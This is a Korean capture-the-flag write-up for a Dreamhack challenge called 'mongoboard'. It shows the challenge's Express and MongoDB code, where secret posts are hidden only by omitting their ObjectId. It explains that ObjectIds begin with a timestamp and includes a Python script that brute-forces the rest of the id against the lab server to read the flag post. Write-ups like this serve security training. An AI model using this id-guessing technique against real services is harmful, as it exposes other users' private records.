## mongoboard (풀이 봄)
---

+ app.js

```javascript
var express     = require('express');
var app         = express();
var bodyParser  = require('body-parser');
var mongoose    = require('mongoose');
var path        = require('path');

// Connect to MongoDB
var db = mongoose.connection;
db.on('error', console.error);
db.once('open', function(){
    console.log("Connected to mongod server");
});
mongoose.connect('mongodb://localhost/mongoboard');

// model
var Board = require('./models/board');

// app Configure
app.use('/static', express.static(__dirname + '/public'));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.all('/*', function(req, res, next) {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "POST, GET, OPTIONS, PUT");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

// router
var router = require(__dirname + '/routes')(app, Board);
app.get('/', function(req, res) {
    res.sendFile(path.join(__dirname + '/index.html'));
});

// run
var port = process.env.PORT || 8080;
var server = app.listen(port, function(){
 console.log("Express server has started on port " + port)
});

```

<br>

+ routes/index.js

```javascript
module.exports = function(app, MongoBoard){
    app.get('/api/board', function(req,res){
        MongoBoard.find(function(err, board){
            if(err) return res.status(500).send({error: 'database failure'});
            res.json(board.map(data => {
                return {
                    _id: data.secret?null:data._id,
                    title: data.title,
                    author: data.author,
                    secret: data.secret,
                    publish_date: data.publish_date
                }
            }));
        })
    });

    app.get('/api/board/:board_id', function(req, res){
        MongoBoard.findOne({_id: req.params.board_id}, function(err, board){
            if(err) return res.status(500).json({error: err});
            if(!board) return res.status(404).json({error: 'board not found'});
            res.json(board);
        })
    });

    app.put('/api/board', function(req, res){
        var board = new MongoBoard();
        board.title = req.body.title;
        board.author = req.body.author;
        board.body = req.body.body;
        board.secret = req.body.secret || false;

        board.save(function(err){
            if(err){
                console.error(err);
                res.json({result: false});
                return;
            }
            res.json({result: true});

        });
    });
}
```

<br>

+ models/board.js

```javascript
var mongoose = require('mongoose');
var Schema = mongoose.Schema;

var boardSchema = new Schema({
    title: {type:String, required: true},
    body: {type:String, required: true},
    author: {type:String, required: true},
    secret: {type:Boolean, default: false},
    publish_date: { type: Date, default: Date.now  }
}, {versionKey: false });

module.exports = mongoose.model('board', boardSchema);
```

<br><br>

## Solution (풀이 봄)
---

Link : <a href="https://domdom.tistory.com/entry/MongoDB-몽고디비-ObjectId-와-날짜datetime-간의-변환하기convert" target="_blank">domdom.tistory.com/entry/MongoDB-몽고디비-ObjectId-와-날짜datetime-간의-변환하기convert</a>

<br>

흠.. objectid와 timestamp 간의 변환이 가능하다고 한다.. 

즉, flag의 objectid는 timestamp 값을 objectid로 변환한 값인 것이다.

단, 여기서 objectid에 대해 알아가야 하는데 그건 위의 링크에 설명되어 있다.

정리하면 objectid는 12byte의 값인데 앞의 4바이트는 timestamp 값을 변환한 것이고, 나머지 8바이트는 mongodb에서 지정한 랜덤 값으로 이루어져 있다.

따라서 브루트포스로 objectid를 게싱해서 flag의 게시글에 들어가면 된다.

<br>

```python
import requests
import itertools


headers={'Content-Type':'application/json; charset=utf-8'}

text = '0123456789abcdef'
b = itertools.product(text, repeat=16)

for i in b:
	objid = '629d545b' + ''.join(i)
	print("objid : ", objid)
	url = 'http://host1.dreamhack.games:23311/api/board/'+objid
	res = requests.get(url, headers=headers)
	if "error" not in res.text:
		print(res.text)
```

<br>
